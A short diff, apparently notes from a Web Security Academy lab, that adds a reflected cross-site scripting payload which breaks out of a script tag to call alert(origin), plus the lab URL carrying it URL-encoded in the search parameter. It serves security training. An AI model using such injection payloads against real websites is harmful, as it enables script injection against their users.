@@ -1,0 +1,5 @@
+
+
+</script><script>alert(origin)</script>
+
+https://0a1200c8031b2ca281307f97002d007f.web-security-academy.net/?search=%3C%2Fscript%3E%3Cscript%3Ealert%28origin%29%3C%2Fscript%3E
